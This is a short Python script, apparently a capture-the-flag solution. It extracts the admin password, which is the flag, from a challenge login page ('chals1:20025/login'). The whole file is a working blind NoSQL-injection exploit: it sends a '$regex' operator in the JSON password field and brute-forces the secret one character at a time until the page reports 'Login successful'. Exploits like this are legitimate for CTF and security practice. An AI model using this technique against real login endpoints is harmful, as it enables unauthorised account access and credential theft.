import requests, string, re
from bs4 import BeautifulSoup

URL = "http://chals1:20025/login" 

username = "admin"
password = "CTF{"
CHARSET = string.ascii_letters + string.digits + string.punctuation
SUCCESS_MARKER = "Login successful"

session = requests.Session()
print("Session start")

while True:
    for c in CHARSET:
        pw = password + c
        data = {
            "username": username,
            "password": {
                "$regex": "^" + re.escape(pw)
            }
        }

        r = session.post(URL, json=data)
        
        if SUCCESS_MARKER.lower() in r.text.lower():
            password += c
            print(password)
            break

    if password.endswith("}"):
        break

print('-'*30)
print("[+] Flag:", password)